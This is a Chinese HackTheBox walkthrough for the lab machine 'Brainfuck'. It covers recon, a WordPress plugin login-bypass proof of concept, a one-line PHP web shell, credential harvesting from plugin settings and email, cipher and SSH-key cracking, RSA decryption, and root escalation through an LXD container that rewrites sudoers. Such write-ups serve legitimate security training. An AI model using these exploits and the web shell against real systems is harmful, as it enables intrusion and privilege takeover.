Brainfuck
是一个非常困难的靶机，知识点涉及任意用户登录、维吉尼亚密码解密、SSH私钥登录、RSA解密、LXD/LXC提权、sudo提权等。感兴趣的同学可以在HackTheBox中进行学习。  
![](https://image.3001.net/images/20221219/1671414964_639fc4b497163b921d535.png!small)
_通关思维导图：_  
![Brainfuck](https://image.3001.net/images/20221219/1671414966_639fc4b6ec5dbf0e908ee.png!small)

## 0x01 侦查

### 端口探测

首先使用 nmap 进行端口扫描：

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.17 -oA nmap_Brainfuck --min-rate=1000
    

![](https://image.3001.net/images/20221219/1671414969_639fc4b9711e338e246d5.png!small)

扫描结果显示目标开放22、25、110、143、443端口，同时在 SSL 证书中发现如下三个域名：

    
    
    brainfuck.htb
    www.brainfuck.htb
    sup3rs3cr3t.brainfuck.htb
    

#### 443端口

访问为 Nginx 默认界面。  
![](https://image.3001.net/images/20221219/1671414971_639fc4bbef9ba6cc3c918.png!small)

在 hosts 文件中配置域名解析。

    
    
    vim /etc/hosts
    #配置
    10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
    

访问域名`www.brainfuck.htb`会重定向至`brainfuck.htb`，浏览页面后发现以下几点信息：

  * 站点提示采用 WordPress 框架

  * 文章标题为开发更新，作者是`admin`

  * 文章内容为 SMTP 整合已就绪，请检查并发送邮箱至`orestis@brainfuck.htb`

![](https://image.3001.net/images/20221219/1671414973_639fc4bd9946740628966.png!small)

访问域名`sup3rs3cr3t.brainfuck.htb`，站点标题为超级密码论坛。  
![](https://image.3001.net/images/20221219/1671414975_639fc4bfd66ce61b43a41.png!small)

点击`Start a Discussion`进入登录界面，但目前并没有可用账号，尝试注册用户`mac`。  
![](https://image.3001.net/images/20221219/1671414977_639fc4c1903f323306547.png!small)

注册完成后页面提示已发送确认信息至我的邮箱，同时在`Development`讨论中发现两个用户，分别是`admin`、`orestis`。  
![](https://image.3001.net/images/20221219/1671414979_639fc4c31769b8cba9549.png!small)

### 目录扫描

使用 gobuster 对站点进行目录扫描，结果显示为 WordPress 的常见目录及文件。

    
    
    gobuster dir -u https://www.brainfuck.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100 --no-error -k
    

![](https://image.3001.net/images/20221219/1671414980_639fc4c4bd5d80c95220f.png!small)

访问`/wp-admin`目录出现 WordPress 标志确定该网站采用了 WordPress 框架。  
![](https://image.3001.net/images/20221219/1671414982_639fc4c689432026d0ecb.png!small)

### 漏洞扫描

使用 wpscan 对 WordPress 模版进行专项扫描，结果显示 WordPress 主题为`proficient。`

    
    
    wpscan --url https://brainfuck.htb  --api-token xxxxNLjvRw21xxxxxxxxx -e --disable-tls-checks
    

![](https://image.3001.net/images/20221219/1671414984_639fc4c836043b09ec696.png!small)

发现 WordPress 插件 wp-support-plus-responsive-ticket-system，当前版本为
7.1.3，其中可能存在六个漏洞。  
![](https://image.3001.net/images/20221219/1671414986_639fc4ca794dea60ff4f4.png!small)

同时还发现两个用户名，分别是`admin`、`administrator`。  
![](https://image.3001.net/images/20221219/1671414988_639fc4cc591f9f5ce2858.png!small)

## 0x02 上线[orestis]

### 任意用户登录

一般情况下 WordPress 的利用点都在插件当中，站点中只存在插件 wp-support-plus-responsive-ticket-system，经验证发现权限提升漏洞可用，访问参考链接查看漏洞详情：  
![](https://image.3001.net/images/20221219/1671414990_639fc4ce846f8a0f76439.png!small)

根据描述可知，该漏洞因`wp_set_auth_cookie()`函数的不正确使用导致攻击者无需密码便可登录任意用户，根据当前环境修改 POC 如下：

    
    
    <form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
    </form> 
    

![](https://image.3001.net/images/20221219/1671414992_639fc4d01de0b5fcd398e.png!small)

点击`Login`发送登录请求包如下：  
![](https://image.3001.net/images/20221219/1671414993_639fc4d1c9c4f4ecfbcbf.png!small)

再次访问首页已成功登录`admin`。  
![](https://image.3001.net/images/20221219/1671414995_639fc4d3ace47d29f7c1b.png!small)

### WordPress后台

拥有 WordPress 后台管理权限后，存在多种方式可获取权限，以下简单介绍几种思路：

#### 主题编辑

在后台中点击`Apperance`》`editor`尝试编辑主题，但页面提示用户不具有写入权限，因此该方法失效。  
![](https://image.3001.net/images/20221219/1671414997_639fc4d548c7419ffb575.png!small)

#### 插件上传

WordPress 的插件可以非常简单，比如只包含一个小马，内容如下：

    
    
    <?php system($_REQUEST['mac']);?>
    

把木马压缩为 zip 文件。

    
    
    zip mac.zip mac.php
    

![](https://image.3001.net/images/20221219/1671414998_639fc4d6e41cb4e239312.png!small)

在后台中点击`Plugins`》`Add New`上传新制作的插件。  
![](https://image.3001.net/images/20221219/1671415000_639fc4d8563a326226147.png!small)

点击安装后出现报错并提示无法创建文件夹，因此该方法失效。  
![](https://image.3001.net/images/20221219/1671415003_639fc4db3b587ec4a8682.png!small)

#### 插件编辑

在后台中点击`Plugins`》`Editor`尝试编辑插件，但与主题编辑时的提示相同，用户不具有写入权限，因此该方法失效。  
![](https://image.3001.net/images/20221219/1671415005_639fc4dd32b3b2be7e59b.png!small)

### SMTP登录

#### 插件信息收集

进入插件页面共发现四款插件，其中`Easy WP SMTP`比较令人感兴趣，因为文章中提到 SMTP 整合已就绪。  
![](https://image.3001.net/images/20221219/1671415007_639fc4df6c0ef3856aae6.png!small)

点击`Settings`进入设置，成功发现 SMTP 登录信息，但对密码进行了隐藏。  
![](https://image.3001.net/images/20221219/1671415010_639fc4e270b2906d378f7.png!small)

查看页面源代码，修改密码的`type`类型为`text`成功显示密码。

    
    
    orestis/kHGuERB29DNiNE
    

![](https://image.3001.net/images/20221219/1671415013_639fc4e5871a067dfc67d.png!small)

#### 论坛登录信息

使用拿到的账号密码成功登录 SMTP 服务，邮箱中存在两封邮件。

    
    
    telnet 10.10.10.17 110
    > USER orestis 
    > PASS kHGuERB29DNiNE
    > LIST
    

分别查看邮件内容，第一封邮件提示 WordPress
站点已经搭建完成，而在第二封邮件中发现`secret`论坛的账号密码`orestis/kIEnnfEKJ#9UmdO`。

    
    
    > RETR 1
    > RETR 2
    

![](https://image.3001.net/images/20221219/1671415016_639fc4e83e98bf8491589.png!small)

### SSH登录

#### 解密维吉尼亚密文，使用邮件中的账号密码成功登录超级密码论坛，其中存在关于`SSH Access`和`Key`的讨论。  
![](https://image.3001.net/images/20221219/1671415018_639fc4ea37cef934d94a0.png!small)

进入`SSH Access`发现用户 admin 和 orestis 的对话，内容大致为登录 SSH 不能使用密码，而需要使用 key
进行登录，orestis 请求 admin 获取 key 但被 admin 以保密原因拒绝，因此 orestis 新开了个加密的帖子进行对话。  
![](https://image.3001.net/images/20221219/1671415019_639fc4ebd2449bcb28206.png!small)

进入`Key`则发现单词已经被加密，因此可确认这就是 orestis 新开的加密帖子，其中可能存在用于登录 SSH 的 key。  
![](https://image.3001.net/images/20221219/1671415021_639fc4eda0b711e5175be.png!small)

根据上下文推测密文对应明文如下：

    
    
    密文：Pieagnm - Jkoijeg nbw zwx mle grwsnn
    明文：Orestis - Hacking for fun and profit
    

通过 Python 的 zip() 函数从字符串中分离字符对比匹配

    
    
    > enc = "Pieagnm - Jkoijeg nbw zwx mle grwsnn"
    > pt = "Orestis - Hacking for fun and profit"
    > list(zip(enc,pt))
    

![](https://image.3001.net/images/20221219/1671415023_639fc4ef893180dbdc9d2.png!small)

通过 Python 的 ord()
函数组合实验寻找加密密钥，结果显示密钥可能是`mybrainfuck`、`brainfuckmy`、`fuckmybrain`。

    
    
    > [ord(e)-ord(p) for e,p in zip(enc,pt)]
    > [(ord(e)-ord(p))%26 for e,p in zip(enc,pt)]
    > [(ord(e)-ord(p))%26 + ord('a') for e,p in zip(enc,pt)]
    > [chr((ord(e)-ord(p))%26 + ord('a')) for e,p in zip(enc,pt)]
    

![](https://image.3001.net/images/20221219/1671415024_639fc4f0db8a8a2c96ad2.png!small)

在破解网站设置密钥解密维吉尼亚密文，成功找到密钥为`fuckmybrain`。

 **破解地址：https://www.dcode.fr/vigenere-cipher**  
![](https://image.3001.net/images/20221219/1671415027_639fc4f30258d47d22888.png!small)

因此`Key`中 admin 与 orestis 的对话如下：

    
    
    orestis：Hey give me the url for my key bitch :)
    admin：Say please and i just might do so...
    orestis：Pleeeease....
    admin：There you go you stupid fuck, I hope you remember your key password because I dont :)
    https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
    orestis：No problem, I'll brute force it ;)
    

根据对话内容目前虽然有了登录私钥`id_rsa`，但是其中的密码未知，需要通过爆破获取。

#### 私钥密码破解

下载 SSH 私钥`id_rsa`

    
    
    curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k -o id_rsa
    

![](https://image.3001.net/images/20221219/1671415028_639fc4f4c25f82156fc28.png!small)

通过 ssh2john 把`id_rsa`转换为哈希，以便使用 john 爆破。

    
    
    python /usr/share/john/ssh2john.py id_rsa   
    

![](https://image.3001.net/images/20221219/1671415030_639fc4f684c26ad1c1ff5.png!small)

使用 john 进行爆破，成功拿到密码为`3poulakia!`。

    
    
    john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
    

![](https://image.3001.net/images/20221219/1671415032_639fc4f8d3dc7b2adabdc.png!small)

#### 私钥登录SSH

尝试利用该私钥登录 SSH，首先赋予其 400 权限。

    
    
    chmod 400 id_rsa
    

使用私钥登录用户 orestis 并输入密码。

    
    
    ssh -i id_rsa orestis@10.10.10.17
    

![](https://image.3001.net/images/20221219/1671415034_639fc4fab5f57203d0c19.png!small)

在当前用户家目录中成功找到第一个flag。

    
    
    ls
    cat user.txt
    

![](https://image.3001.net/images/20221219/1671415036_639fc4fc23d0241158b06.png!small)

## 0x03 权限提升[root]

### 信息收集

在当前用户家目录中发现多个`txt`文档，其中`output.txt`提示为加密后的密码。

    
    
    cat debug.txt
    cat output.txt
    

![](https://image.3001.net/images/20221219/1671415037_639fc4fd7fd0c1048ea20.png!small)

而`encrypt.sage`是 SageMath 脚本文件，这种编程语言建立在 Python 之上，因此看起来与 Python 并没有什么两样。  
![](https://image.3001.net/images/20221219/1671415039_639fc4ff7a6f7914bd0f4.png!small)

代码显示脚本使用 RSA 加密机制，读取`/root/root.txt`内容并转换为整数`m`，经编码后为十六进制字符串，最终使用 Integer
函数把结果转换为整数；通过 random_prime
函数随机生成两个素数`p`、`q`，它们用于生成公钥的模数`n`；当然公钥还包含一个指数`e`，它从小于`n`的整数`phi`中随机选择，而`phi`等于`p-1`和`q-1`的乘积，同时检查`e`的值以确保它与`phi`互质。最终密码`m`使用公钥（e，n）进行加密，方法转换为数学公式是`c
= (m**e)%n`，加密后的密码写入至`output.txt`，而`p`、`q`、`e`输出至`debug.txt`。

### RSA解密

>
> RSA算法是一种非对称加密算法，所谓非对称加密是相对于对称加密而言，一般来说对称加密即算法加密和解密使用相同的密钥，非对称加密即算法加密和解密使用不同的密钥。在
> RSA
> 算法中加密密钥是公开的，而解密密钥则是保密的，同时加密算法和解密算法一样公开，虽然私钥由公钥决定，但是由于无法计算出大数`n`的欧拉函数`phi`，因此无法根据公钥计算出私钥，其中
> RSA 加解密算法如下：
    
    
    m**e % n = c 加密运算
    c**d % n = m 解密运算
    

根据 RSA 算法机制以及`p`、`q`、`e`计算私钥`d`和明文`m`。

    
    
    def egcd(a, b):
        x,y, u,v = 0,1, 1,0
        while a != 0:
            q, r = b//a, b%a
            m, n = x-u*q, y-v*q
            b,a, x,y, u,v = a,r, u,v, m,n
            gcd = b
        return gcd, x, y
    
    def main():
    
        p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
        q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
        e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
        ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
    
        # compute n
        n = p * q
    
        # Compute phi(n)
        phi = (p - 1) * (q - 1)
    
        # Compute modular inverse of e
        gcd, a, b = egcd(e, phi)
        d = a
    
        print( "n:  " + str(d) );
    
        # Decrypt ciphertext
        pt = pow(ct, d, n)
        print( "pt: " + str(pt) )
    
    if __name__ == "__main__":
        main()
    

![](https://image.3001.net/images/20221219/1671415041_639fc5012000fa32a1332.png!small)

使用`f-string`把`pt`中的值转换为十六进制字符串，再通过`bytes.fromhex()`把十六进制字符串转换为字符串，其中`decode()`方法的默认编码为`UTF-8`，因此生成的字符串以`UTF-8`编码。

    
    
    > pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
    > f"{pt:x}"
    > bytes.fromhex(f"{pt:x}").decode()
    

![](https://image.3001.net/images/20221219/1671415042_639fc502b76d3b128f271.png!small)

成功拿到第二个flag

### LXD/LXC容器提权

> LXD 是基于 LXC 容器技术实现的轻量级容器管理程序，而 LXC 是 Linux 系统自带的容器。提权原理与 Docker
> 提权非常相似，本质都是利用用户创建一个容器，在容器中挂载宿主机的磁盘后使用容器的权限操作宿主机磁盘修改敏感文件，比如`/etc/passwd`、`/root/.ssh/authorized_keys`、`/etc/sudoers`等，从而完成提权。

通过`id`命令发现当前用户处于`lxd`用户组当中。

    
    
    id
    

![](https://image.3001.net/images/20221219/1671415044_639fc5041b10acb79cd9f.png!small)

经命令查询后发现当前主机并不存在容器及相关镜像。

    
    
    lcx list
    lcx image list
    

![](https://image.3001.net/images/20221219/1671415045_639fc50565e7642811ee6.png!small)

在创建容器之前必须先上传一个镜像，首先进入`/dev/shm`目录通过 base64 编码写入镜像包。

    
    
    echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
    

把镜像包导入至`LXC`当中。

    
    
    lxc image import bob.tar.bz2 --alias bobImage
    

查看当前镜像发现`bobImage`已存在。

    
    
    lxc image list
    

![](https://image.3001.net/images/20221219/1671415047_639fc507474c44a396f12.png!small)

初始化容器并设置容器名为`bobVM`，与此同时添加文件系统的根目录至`/r`。

    
    
    lxc init bobImage bobVM -c security.privileged=true
    lxc config device add bobVM realRoot disk source=/ path=r
    

![](https://image.3001.net/images/20221219/1671415049_639fc509cc8c990409fc1.png!small)

启动容器后检查容器是否运行。

    
    
    lxc start bobVM
    lxc list
    

![](https://image.3001.net/images/20221219/1671415051_639fc50b5b70346f23b29.png!small)

进入容器运行`bash`，成功找到`/r`目录。

    
    
    lxc exec bobVM -- /bin/bash
    

![](https://image.3001.net/images/20221219/1671415052_639fc50cc03139d4b9f34.png!small)

在`/r/root`目录中发现第二个flag。

    
    
    cat /r/root/root.txt
    

![](https://image.3001.net/images/20221219/1671415053_639fc50dee67624a91745.png!small)

#### 写入SSH公钥

在本地生成 SSH 密钥对。

    
    
    ssh-keygen -t rsa
    

在`/r/root`下创建目录`.ssh`并写入公钥至`authorized_keys`。

    
    
    cd /r/root && mkdir .ssh && cd .ssh
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDJUKJAoEofREFO+cRcnARjXXeUrzMEkMzSIu58iktG//vJNZFcKMuPP2peCwmM9yxkHgqiQq55B6UbDXCbbUIigCeOUKMIOuxshiy8WD5XgGOJ2fjvDZCsst78rRMcjH7eBwe/pEqV9fAJiwi7r9JyWp74AB3wP3xTw6KPxLG8RxeAGpS0p9fDFJmKQtWHPpOF/V7EdphkrzKRfNGSJPRiLsHQpRENgNP6lKmK/FwOK0Bb7jyphq/N+k/X4pt2JUeCPwYsPA1QgyZIOwxytZRjPz5zuTCPEGlEaxi95LzUGTqmN18TSX1Cb1NxvKoZdQkgK4WPYnUn1i482vmS4w2uvBMRAW1mvsiAIE96ngA6eGGk7jjHIT/LN3DRZzNqrDGlHHjK16KpidGJq3QlFNjBS5hsvCNyAcU5GtHmpPkcSYYjayUgWwaC4eapz7kzqlu+T9BQLY3qbGGIPCbTahG9013Lx+YAhCIKdSuLXcknOvMmnuJrNzJtWop0mxYMK9zJolGQxsqDFFHeWFZCeCbNV3p21408YZepH6lcRRdBUYJWvMifY/AUuzm6z63AyyK+QR1yjZR3jhshF3HpJ7x/LSqsTI/hVa7PbbqmC3Qd3Pazl80SmmOwyFpFLqZfwUk5Mm8AN1l488uOTFL9koo4ZBP7cGP6m63cPXwe54yzAw== root@kali" > authorized_keys
    

赋予`authorized_keys`600 权限。

    
    
    chmod 600 authorized_keys
    

![](https://image.3001.net/images/20221219/1671415055_639fc50f419190d8384b6.png!small)

但是尝试通过私钥登录失败。  
![](https://image.3001.net/images/20221219/1671415057_639fc511ab678c9a9d33a.png!small)

因为 SSH 配置中不允许 root 用户登录。

    
    
    cat /r/etc/ssh/sshd_config | grep -i root
    

![](https://image.3001.net/images/20221219/1671415059_639fc51307765986b364e.png!small)

#### 写入sudoers

在`sudoers`中写入以下内容，允许当前用户`orestis`无密码执行`sudo`命令。

    
    
    echo "orestis ALL=(ALL) NOPASSWD: ALL" >> /r/etc/sudoers
    

返回命令行查看`sudo`权限，发现可使用`sudo`执行任意命令。

    
    
    sudo -l
    

![](https://image.3001.net/images/20221219/1671415060_639fc5144a03d49abe2ef.png!small)

成功提权至root。

    
    
    sudo su
    id
    

![](https://image.3001.net/images/20221219/1671415061_639fc515aa0a5117592bc.png!small)

## 0x04 总结

Brainfuck 译为脑残，该靶机需要用到许多密码学的知识，因此做起来非常困难。通过信息收集在 SSL 证书上发现三个域名，其中`www`子域名使用的
CMS 为 WordPress，查看文章内容提示 SMTP 已就绪，通过 wpscan 扫描找到插件`wp-support-plus-responsive-ticket-system`，该插件可能存在六个漏洞。而`sup3rs3cr3t`子域名内容为超级密码论坛，经浏览后发现存在用户`admin`和`orestis`。

利用插件存在的任意用户登录漏洞成功登录`admin`用户，尝试使用通用的 WordPress 获取权限方式均失效，只在插件设置中找到 SMTP
的登录信息。通过拿到的密码成功登录邮箱，查看邮件后找到超级密码论坛的登录信息。利用该账号密码登录论坛，但其中对话内容已加密，对比已知明文与密文推测密钥，成功解密对话并发现
SSH 私钥。使用 ssh2john 把私钥转换为哈希，利用 john 破解密码，成功通过私钥登录SSH。

在服务器中信息收集找到加密脚本以及相关文档，分析脚本后可知它采用 RSA 加密机制，RSA
是典型的非对称加密算法，通常使用公钥加密、私钥解密，脚本把`root.txt`作为需要保护的明文，通过解密脚本成功解出密钥以及flag。如果想要提权至root就需要借助
LXD 容器，导入镜像并制作容器，启动后在`/etc/sudoers`中写入内容，允许当前用户无密码通过`sudo`执行任意命令，最终成功提权至 root。

